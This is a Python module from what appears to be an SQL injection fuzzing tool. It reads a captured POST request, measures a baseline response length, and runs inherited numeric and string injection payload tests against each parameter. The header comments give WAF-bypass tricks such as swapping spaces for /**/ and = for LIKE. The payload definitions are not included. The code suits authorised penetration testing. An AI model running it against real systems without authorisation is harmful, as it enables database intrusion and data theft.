# post注入
# 先用特殊字符检测，然后判断是数字型还是字符型注入
# 用/***/替换空格，用like替换=   具体案例看漏洞集合\骚姿势漏洞\绕Waf注入
import requests
from termcolor import cprint
import threading
from queue import Queue
from Libs.fuzzClass import FuzzFather

event = threading.Event()
event.set()
q = Queue(-1)

class Fuzz(FuzzFather):

    def __init__(self, postPath, url=None, cookie=None):
        FuzzFather.__init__(self)
        self.postPath = postPath
        self.url = ''
        self.params = ''
        self.headers = {}
        self.get_headers_postdata()     # 获取post里的url, headers, data
        self.paramsList = self.params.split('&')       # 将字符串型的参数改为已&分割的列表
        try:
            self.standard_length = len(requests.post(url=self.url, data=self.params, headers=self.headers).text)  # 正常url响应包的长度
        except Exception as e:
            self.standard_length = 0
        self.nums = len(self.paramsList) * len(self.test) + len(self.paramsList) + len(self.paramsList) * len(self.quotes_brackets) * len(self.Notes)   # 计算共请求次数
        cprint('[{}] 测试 : [{}] [{}]  :  {}'.format(self.nums, self.standard_length, self.url[:-1], self.params), 'red')     # 打印正常包的响应长度
        self.num = 1
        self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads = [], [], [], []

    def get_headers_postdata(self, protocol='http'):

        flag = False  # 标志，当设置为True时，开始取post包里的data数据

        with open(self.postPath, 'rt') as f:
            path = str(f.readline()).split(' ')[1]
            host = str(f.readline()).split(': ')[1][:-1]
            # 上传文件的url
            self.url = protocol + '://' + host + path

            for each in f.readlines():
                # 获取post包里的data数据
                if flag:
                    self.params = each
                    continue

                # 因为referer这一行有2个冒号
                if 'Referer' in each:
                    self.headers['Referer'] = each[9:-1]
                    continue

                # 因为User-Agen这一行有多个冒号
                if 'User-Agent' in each:
                    self.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'
                    continue

                # 在Content-Length后面都是提交的数据包
                if '\n' == each:
                    flag = True  # 开始获取post包的data数据
                    continue

                # 获取post内的请求头数据
                _key = each.split(': ')[0]
                _value = each.split(': ')[1][:-1]
                self.headers[_key] = _value



    # 攻击
    def attack(self):
        self.test_sql(url=self.url, params=self.params, headers=self.headers, standard_length=self.standard_length, type='post')            # url是请求的路径，params是post型参数
        self.digit_payload(url=self.url, params=self.params, headers=self.headers, standard_length=self.standard_length, type='post')
        self.char_payload(url=self.url, params=self.params, headers=self.headers, standard_length=self.standard_length, type='post')
        return self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads, self.wafPayloads


# 这是单独使用脚本
# postPath = r'C:\Users\Asus\Desktop\py\py3\project\sql_inject_fuzz\post.txt'
# Fuzz(postPath).attack()
